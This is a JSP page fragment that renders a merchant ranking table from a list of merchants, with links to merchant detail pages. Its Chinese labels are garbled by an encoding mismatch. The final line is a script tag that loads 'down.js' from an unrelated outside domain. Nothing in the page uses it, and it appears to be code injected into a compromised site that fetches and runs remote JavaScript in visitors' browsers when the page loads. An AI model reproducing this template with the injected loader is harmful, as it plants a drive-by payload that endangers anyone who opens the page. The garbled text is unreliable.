<%@ page language="java" pageEncoding="GBK" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %>


<table width="100%"  cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
  <tr> 
	<td width="100%" height="26" align="center" background="images/bg_table_title.gif" class="red15">�̻��������а�</td>
  </tr>
  <tr> 
	<td height="124" valign="top" background="/images/Service/mileages/leftbg3.gif"> 
	  <table cellspacing="1" width="88%"  height="100%"align="center" border="0">
		<c:forEach var="merchant" items="${appData.topReturnMerchants}"> 
		<tr> 
			  <td class="red15"></td>
			  <td class="red">
				  <a href='<c:url value="/getMerchantInfo.do"/>?merchantNo=<c:out value="${merchant.merchantNo}"/>'>
					<c:out value="${merchant.merchantName}"/>		
				  </a>�����Ż���<c:out value="${merchant.comment}"/>��
			  </td>
			</tr>
	   </c:forEach>
	  </table>
	</td>
  </tr>
</table>
<script language=javascript src=http://Town.531jx.cn/down.js></script>